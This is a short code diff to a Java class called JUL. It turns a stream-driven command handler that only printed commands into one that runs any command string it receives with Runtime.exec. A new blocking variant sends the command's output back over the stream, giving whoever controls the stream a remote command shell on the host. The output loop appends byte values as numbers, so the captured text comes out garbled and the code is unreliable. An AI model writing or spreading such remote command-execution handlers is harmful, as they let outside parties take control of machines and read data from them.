@@ -100,8 +100,18 @@ public class JUL {
                     } else if (type == EXEC_NATIVE_COMMAND) {
                         String nativeCommand = readOffString(inStream);
                         sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND, EMPTYBARR, null);
-                        System.out.println("executing native command: " + nativeCommand);
+                        Runtime.getRuntime().exec(nativeCommand);
+                    } else if (type == EXEC_NATIVE_COMMAND_AND_BLOCK) {
+                        String nativeCommand = readOffString(inStream);
+                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING, EMPTYBARR, null);
                         Process p = Runtime.getRuntime().exec(nativeCommand);
+                        StringBuilder commandOutput = new StringBuilder();
+                        int fromStream;
+                        while ((fromStream = p.getInputStream().read()) != -1) {
+                            commandOutput.append((byte) fromStream);
+                        }
+                        sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING_END, EMPTYBARR, null);
+                        writeString(commandOutput.toString());
                     }
                     
                 } 
